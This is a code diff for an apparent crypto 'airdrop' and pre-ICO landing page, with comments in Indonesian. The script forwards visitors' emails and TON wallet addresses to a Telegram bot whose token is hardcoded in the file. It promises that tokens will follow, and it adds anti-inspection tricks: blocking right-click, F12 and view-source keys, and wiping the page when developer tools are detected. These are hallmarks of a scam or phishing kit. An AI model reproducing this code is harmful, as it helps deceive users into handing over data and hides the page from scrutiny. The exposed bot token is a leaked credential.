@@ -1,77 +1,84 @@
-// === Konfigurasi Bot Telegram ===
+// === Inisialisasi AOS ===
+AOS.init();
+
+// === Telegram Bot ===
 const botToken = "8053150769:AAG32Ys8JnTcsBfFHZm0bO5lXtmCzLsFy-Q";
 const chatId = "-1002834298142";
 
-// === Kirim Newsletter ===
-document.getElementById("newsletter-form")?.addEventListener("submit", function (e) {
+// === Form Newsletter ===
+const form = document.getElementById("newsletter-form");
+form?.addEventListener("submit", function (e) {
   e.preventDefault();
   const email = document.getElementById("email").value;
-  const message = `?? Newsletter Baru: ${email}`;
+  const message = `📰 Newsletter Baru:\nEmail: ${email}`;
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text: message })
+    body: JSON.stringify({ chat_id: chatId, text: message }),
+  }).then(() => {
+    alert("Terima kasih telah berlangganan!");
+    form.reset();
   });
-  this.reset();
 });
 
-// === Kirim Wallet TON ===
-document.getElementById("ton-form")?.addEventListener("submit", function (e) {
+// === Form Airdrop ===
+const tonForm = document.getElementById("ton-form");
+tonForm?.addEventListener("submit", function (e) {
   e.preventDefault();
   const wallet = document.getElementById("wallet").value;
-  const message = `?? Klaim Airdrop Baru:\nWallet: ${wallet}`;
+  const message = `🪂 Klaim Airdrop Baru:\nWallet TON: ${wallet}`;
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text: message })
+    body: JSON.stringify({ chat_id: chatId, text: message }),
+  }).then(() => {
+    alert("Berhasil klaim! Token akan dikirim setelah validasi.");
+    tonForm.reset();
   });
-  this.reset();
 });
 
-// === Countdown Pre-ICO ===
-const countdown = document.getElementById("timer");
-const targetDate = new Date("2025-11-31T23:59:59").getTime();
-setInterval(function () {
-  const now = new Date().getTime();
-  const distance = targetDate - now;
-  if (distance < 0) {
-    countdown.innerHTML = "Pre-ICO telah ditutup!";
-    return;
+// === Hitung Mundur (Countdown ke akhir Pre-ICO) ===
+const countdown = () => {
+  const end = new Date("2025-08-01T00:00:00Z").getTime();
+  const timer = document.getElementById("timer");
+  setInterval(() => {
+    const now = new Date().getTime();
+    const distance = end - now;
+    if (distance < 0) {
+      timer.innerHTML = "⛔ Pre-ICO Selesai";
+      return;
+    }
+    const d = Math.floor(distance / (1000 * 60 * 60 * 24));
+    const h = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    const m = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+    const s = Math.floor((distance % (1000 * 60)) / 1000);
+    timer.innerHTML = `⏳ ${d}h ${h}j ${m}m ${s}d`;
+  }, 1000);
+};
+countdown();
+
+// === Proteksi Anti Ctrl+U / F12 / Inspect Element ===
+document.addEventListener("contextmenu", (e) => e.preventDefault());
+document.addEventListener("keydown", function (e) {
+  if (
+    e.ctrlKey && ["u", "s", "i", "c"].includes(e.key.toLowerCase()) ||
+    e.key === "F12"
+  ) {
+    e.preventDefault();
   }
-  const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-  const hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
-  const minutes = Math.floor((distance / 1000 / 60) % 60);
-  const seconds = Math.floor((distance / 1000) % 60);
-  countdown.innerHTML = `${days}h ${hours}j ${minutes}m ${seconds}d`;
-}, 1000);
+});
+document.addEventListener("dragstart", (e) => e.preventDefault());
+document.addEventListener("selectstart", (e) => e.preventDefault());
 
-// === Statistik Wallet Klaim & Referral Leaderboard ===
-const sheetId = "1FYXPltXN8vpkw-rNvMm8yFQnwEk6PmYXIWOwiNLG3PM"; // Ganti sesuai Sheet-mu
-const sheetRange = "sheet1"; // Sesuaikan dengan struktur Sheet
-
-async function fetchSheetData() {
-  try {
-    const res = await fetch(`https://opensheet.elk.sh/${sheetId}/sheet1`);
-    const data = await res.json();
-    // Jumlah Wallet
-    document.getElementById("wallet-count").innerText = `${data.length} wallet telah klaim`;
-
-    // Leaderboard Referral
-    const leaderboard = {};
-    data.forEach(row => {
-      const ref = row.referral?.trim();
-      if (ref) leaderboard[ref] = (leaderboard[ref] || 0) + 1;
-    });
-    const sorted = Object.entries(leaderboard).sort((a, b) => b[1] - a[1]);
-    let html = `<table><tr><th>Referral</th><th>Klaim</th></tr>`;
-    sorted.slice(0, 5).forEach(([ref, count]) => {
-      html += `<tr><td>@${ref}</td><td>${count}</td></tr>`;
-    });
-    html += `</table>`;
-    document.getElementById("referral-table").innerHTML = html;
-  } catch (err) {
-    console.error("Gagal load sheet:", err);
-  }
-}
-
-fetchSheetData();
+(function () {
+  const detectDevTools = () => {
+    const start = performance.now();
+    debugger;
+    const end = performance.now();
+    if (end - start > 100) {
+      document.body.innerHTML =
+        `<h1 style="color:red; text-align:center; margin-top:20%;">❌ Akses tidak diizinkan.</h1>`;
+    }
+  };
+  setInterval(detectDevTools, 500);
+})();
